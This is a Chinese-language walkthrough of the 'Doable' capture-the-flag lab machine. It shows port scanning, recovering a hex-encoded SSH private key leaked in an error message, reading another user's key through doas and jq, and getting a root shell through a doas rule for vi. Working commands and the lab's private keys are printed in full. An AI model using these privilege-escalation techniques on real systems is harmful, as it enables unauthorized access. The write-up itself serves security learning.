---
title: Doable
weight: 3
comments: true
type: docs
---
## collect informations

> scan ports

```bash
rustscan -a 192.168.0.101
```

![rustscan](./Doable_Yolo.assets/image-20260728162351203.png)

> 80

在网站源代码中看到特殊的注释，说是报错信息自带key

![hint](./Doable_Yolo.assets/image-20260728162714867.png)

只有在传递错误参数的时候才能看到报错信息吧，再简单进行路径扫描没有结果后去分析5000端口

> 5000

随意测试的时候，报错结果都是Not correct，当我测试password的时候，返回结果变了，原本考虑到本题密码可能是逐位比对，测试失败后想到80注释的字面意义就是报错包含密码，尝试输入incorrect得到了新的响应

![password](./Doable_Yolo.assets/image-20260728164413347.png)

![incorrect](./Doable_Yolo.assets/image-20260728164443547.png)

![again later](./Doable_Yolo.assets/image-20260728164543058.png)

获取到一串16进制字符

![hex](./Doable_Yolo.assets/image-20260728164612663.png)

解码hex，是ssh的私钥

![ssh](./Doable_Yolo.assets/image-20260728165956086.png)

处理方式是解码16进制为二进制，然后base64编码后加上那两标志分割，添加权限直接远程连接

```bash
echo '6f70656e7373682d6b65792d763100000000046e6f6e65000000046e6f6e650000000000000001000000330000000b7373682d6564323535313900000020afce9a5916af9b25f74359c537873e4745cdf4cd680841a492e094f5ef55214e0000009019cf986a19cf986a0000000b7373682d6564323535313900000020afce9a5916af9b25f74359c537873e4745cdf4cd680841a492e094f5ef55214e00000040ed8fdefb5f54ba38daa4f33cbe3ffd09f38de41bddddce9bb15af10ba2702e16afce9a5916af9b25f74359c537873e4745cdf4cd680841a492e094f5ef55214e0000000c656c656e6140446f61626c6501' | xxd -r -p > key.bin
base64 -w0 key.bin > key.b64
cat > id_ed25519 <<EOF
-----BEGIN OPENSSH PRIVATE KEY-----
$(cat key.b64)
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 id_ed25519
ssh-keygen -l -f id_ed25519
ssh -i id_ed25519 elena@192.168.0.101
```

获取到user flag

![user](./Doable_Yolo.assets/image-20260728170701700.png)

## 水平提权

通过阅读`/etc/passwd`,知道家用户还有个`silas`用户，查看属于`silas`用户的文件以及进程

![pspy64](./Doable_Yolo.assets/image-20260728171419080.png)

都没有成功，只能搜集其它信息去了

查suid的时候遇到了惊喜

<img src="./Doable_Yolo.assets/image-20260728172832042.png" alt="suid" style="zoom:50%;" />

这里的`doas`可以看作`sudo`，允许我无密码以`silas`的身份执行`jq`

查`gtfobins`，发现`jq`似乎只能读任意文件，先读个私钥试试

```bash
elena@Doable:~$ doas -u silas /usr/bin/jq -Rr . /home/silas/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCb6PiVO3wEWLrYoijkGsaGfMXoyCguKZZ8BoXVfccNiwAAAJBzteozc7Xq
MwAAAAtzc2gtZWQyNTUxOQAAACCb6PiVO3wEWLrYoijkGsaGfMXoyCguKZZ8BoXVfccNiw
AAAEDt/QcH2XPStmOaOShQTYGyo5gcmSAheSTHyz0cfJWM4pvo+JU7fARYutiiKOQaxoZ8
xejIKC4plnwGhdV9xw2LAAAACnNpbGFzQE1hemUBAgM=
-----END OPENSSH PRIVATE KEY-----
```

![win](./Doable_Yolo.assets/image-20260728173353188.png)

水平提权成功

## 垂直提权

信息搜集基本做完，没有进展，结合`silas`家目录的那个`what can i do`，能联想到水平提权时候用到的`doas`，似乎还没用完，不能直接扔

![conf](./Doable_Yolo.assets/image-20260728210801236.png)

问的deepseek，这里还有几个权限配置文件我没有看

![others](./Doable_Yolo.assets/image-20260728210948703.png)

这里存在`/etc/doas.d/`路径，由于权限问题，无法访问，靶机上的二进制文件不多，基本都在`/usr/bin`下，我选择搓个命令行脚本遍历，得记得把链接算上

![test](./Doable_Yolo.assets/image-20260728211300819.png)



```bash
for i in $(find -L /usr/bin -type f 2>/dev/null);do
	out=$(doas -u root "$i" --help 2>&1)
	if ! echo "$out" | grep -q "Operation not permitted";then
		echo "find it: $i"
	fi
done
```

![win](./Doable_Yolo.assets/image-20260728211405724.png)

发现vi就是那个隐藏后门，直接进去输入`!/bin/sh`获取root shell

![root](./Doable_Yolo.assets/image-20260728211536175.png)
